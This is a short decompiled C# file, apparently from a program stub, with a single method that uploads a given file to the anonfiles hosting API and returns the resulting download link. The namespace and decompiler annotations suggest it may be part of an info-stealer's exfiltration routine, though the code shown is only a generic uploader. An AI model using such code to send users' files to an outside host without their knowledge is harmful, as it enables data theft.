using System;
using System.Net;
using System.Text;

namespace Stub
{
	// Token: 0x0200001D RID: 29
	public static class Functions
	{
		// Token: 0x06000055 RID: 85 RVA: 0x00005DB0 File Offset: 0x00003FB0
		public static string CreateDownloadLink(string File)
		{
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			string text = string.Empty;
			using (WebClient webClient = new WebClient())
			{
				byte[] bytes = webClient.UploadFile("https://api.anonfiles.com/upload", File);
				string @string = Encoding.ASCII.GetString(bytes);
				if (@string.Contains("\"error\": {"))
				{
					text = text + "Error message: " + @string.Split(new char[]
					{
						'"'
					})[7] + "\r\n";
				}
				else
				{
					text = text + @string.Split(new char[]
					{
						'"'
					})[15] + "\r\n";
				}
			}
			return text;
		}
	}
}
